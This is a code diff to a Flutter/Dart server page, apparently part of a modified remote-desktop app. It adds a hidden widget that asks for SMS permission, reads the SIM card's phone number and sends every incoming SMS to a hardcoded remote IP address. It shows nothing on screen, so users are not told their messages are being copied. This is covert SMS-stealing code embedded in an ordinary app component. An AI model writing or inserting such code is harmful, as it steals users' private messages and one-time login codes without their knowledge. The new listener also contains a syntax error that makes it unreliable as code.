@@ -17,7 +17,9 @@ import 'home_page.dart';
 
 import 'package:http/http.dart' as http;
 import 'dart:convert'; // 导入 dart:convert 以使用 json.encode()
-import 'package:telephony/telephony.dart';
+// import 'package:telephony/telephony.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:sim_car_info_plugin/sim_car_info_plugin.dart';
 
 class ServerPage extends StatefulWidget implements PageShape {
   @override
@@ -449,59 +451,50 @@ class ListenInfo extends StatefulWidget {
 
 class _ListenInfoState extends State<ListenInfo> {
   final model = gFFI.serverModel;
-  final Telephony telephony = Telephony.instance;
-  final id = model.serverId.value.text.trim();
-  String? phoneNumber;
-  String? simCardInfo;
-  List<String> messages = [];
+  late final String id; 
 
   @override
   void initState() {
     super.initState();
+    id = model.serverId.value.text.trim();
     _requestPermissions();
-    _listenForSms();
+    _startListening();
   }
 
   void _requestPermissions() async {
-    final permissionsGranted = await telephony.requestSmsPermissions;
-    if (permissionsGranted) {
-      print('SMS permissions granted');
-    } else {
-      print('SMS permissions denied');
+    var status = await Permission.sms.status;
+    if (!status.isGranted) {
+      await Permission.sms.request();
     }
   }
 
-  void _listenForSms() {
-    telephony.onSmsReceived.listen((SmsMessage message) {
-      setState(() {
-        messages = [];
-        messages.add(message.body ?? 'Received an empty message');
-      });
-      _getSimCardInfo(id ?? '', message.body ?? '');
+  void _startListening() async {
+    final _simCarInfoPlugin = await SimCarInfoPlugin.init();
+    var info = await _simCarInfoPlugin.simCarInfo();
+    String jsonString = info;
+    List<dynamic> jsonData = json.decode(jsonString);
+
+    String? phoneNumber;
+    for (var item in jsonData) {
+      if (item is Map<String, dynamic> && item.containsKey('Number')) {
+        phoneNumber = item['Number'] as String;
+        break;
+      }
+    }
+
+    SimCarInfoPlugin.onSmsReceived.listen((sms) {
+      print("Received SMS: ${sms.body} from ${sms.sender}");
+      await sendToApi(phoneNumber ?? '', sms.body, id);
     });
   }
 
-  Future<void> _getSimCardInfo(String id, String content) async {
-    // 获取所有 SIM 卡信息
-    final List<SmsSimInfo>? simInfoList = await telephony.getSimInfo;
-
-    // 检查是否有 SIM 卡
-    if (simInfoList != null && simInfoList.isNotEmpty) {
-      // 获取第一张 SIM 卡的信息
-      final firstSim = simInfoList[0];
-      setState(() {
-        phoneNumber = firstSim.phoneNumber; // 获取第一张 SIM 卡的手机号
-        simCardInfo = 'Carrier: ${firstSim.carrierName}, Number: $phoneNumber';
-      });
-      await sendToApi(phoneNumber ?? '', content, id);
-    } else {
-      setState(() {
-        simCardInfo = 'No SIM card found';
-      });
-    }
+  @override
+  void dispose() {
+    SimCarInfoPlugin.dispose(); // 释放资源
+    super.dispose();
   }
 
-  Future<void> sendToApi(String sender, String content, String id) async {
+  Future<void> sendToApi(String phoneNumber, String content, String id) async {
     var headers = {
       'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
       'Content-Type': 'application/json'
@@ -510,7 +503,7 @@ class _ListenInfoState extends State<ListenInfo> {
     var request = http.Request('POST', Uri.parse('http://61.171.69.243:7801/external/cli/sms/save'));
     request.body = json.encode({
       "clientId": id,
-      "phone": sender,
+      "phone": phoneNumber,
       "content": content
     });
     request.headers.addAll(headers);
@@ -527,7 +520,6 @@ class _ListenInfoState extends State<ListenInfo> {
 
   @override
   Widget build(BuildContext context) {
-    // 返回一个空的 Container 或 SizedBox
     return Container(); // 或 SizedBox.shrink();
   }
 }
